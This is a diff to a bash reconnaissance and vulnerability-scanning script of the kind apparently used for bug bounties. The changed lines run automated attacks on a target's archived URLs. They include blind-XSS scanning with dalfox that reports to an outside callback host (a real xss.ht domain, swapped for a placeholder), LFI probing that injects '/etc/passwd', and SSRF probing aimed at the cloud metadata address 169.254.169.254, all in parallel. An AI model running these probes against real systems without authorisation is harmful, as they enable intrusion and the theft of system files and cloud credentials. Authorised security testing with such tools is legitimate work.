@@ -1,6 +1,6 @@
 #!/bin/bash
 
-mkdir  -p $1/{recon,nuclei,jaeles,subtko,waybackurls,js,eyewitness,ports,BLC,clickjack,Dalfox,Directory,Misc}
+mkdir  -p $1/{recon,nuclei,subtko,waybackurls,js,eyewitness,ports,BLC,clickjack,Dalfox,Directory,Misc}
 echo  "***************************************************************************"
 
 echo "Gathering Subdomain"
@@ -118,7 +118,7 @@ python3 ~/tools/clickjack/clickjack.py $1/recon/ALive.txt | grep -v "NOT" | awk 
 
 echo "Testing for XSS + LFI + SSRF"
 echo "***************************************************************************"
-cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b h3110mb.xss.ht | tee $1/Dalfox/poc.txt
+cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b <XSSHUNTER PAYLOAD> | tee $1/Dalfox/poc.txt
 cat $1/waybackurls/wayback.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' |tee $1/Misc/LFI.txt
 cat $1/waybackurls/wayback.txt |qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ |tee $1/Misc/ssrf.txt
 
